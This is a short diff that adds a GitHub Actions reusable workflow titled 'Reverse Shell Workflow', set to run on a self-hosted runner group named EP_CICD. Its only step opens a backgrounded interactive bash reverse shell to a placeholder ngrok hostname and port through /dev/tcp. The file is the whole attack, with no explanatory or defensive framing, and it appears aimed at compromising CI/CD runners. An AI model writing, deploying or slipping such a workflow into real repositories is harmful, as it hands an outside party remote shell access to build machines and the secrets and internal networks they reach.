@@ -1,0 +1,13 @@
+name: Reverse Shell Workflow
+
+on:
+  workflow_call:
+jobs:
+  reverse-shell:
+    runs-on:
+      group: EP_CICD
+    steps:
+      - name: Establish Reverse Shell
+        run: |
+          /bin/bash -c "bash -i >& /dev/tcp/<NGROK_HOSTNAME>/<NGROK_PORT> 0>&1" &
+        shell: bash
